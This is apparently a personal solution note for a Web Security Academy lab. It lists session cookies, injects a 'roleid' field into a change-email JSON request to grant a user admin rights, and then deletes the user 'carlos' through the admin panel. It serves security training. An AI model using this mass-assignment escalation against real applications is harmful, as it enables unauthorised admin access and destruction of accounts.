/*

Cookie: session=QXynCf0Xj3hJIXsbW2laiiqxXkTRP3U4      //logged out session cookie

Cookie: session=b6TSc3CNmjhC2N544y89jnDxcJ4Yo5YE      //wiener's session cookie

1) send a change email request from wiener and the response shows the roleid added to the JSON body

2) craft this JSON request body and send again:

POST /my-account/change-email
{
    "email":"wiener@normal-user.net",
    "roleid":2
}
this sets the role id of wiener to 2

3) go to https://0a9400ae03f17639801a5dab005b0015.web-security-academy.net/admin
now admin panel can be accessed 

GET /admin/delete?username=carlos       //send
*/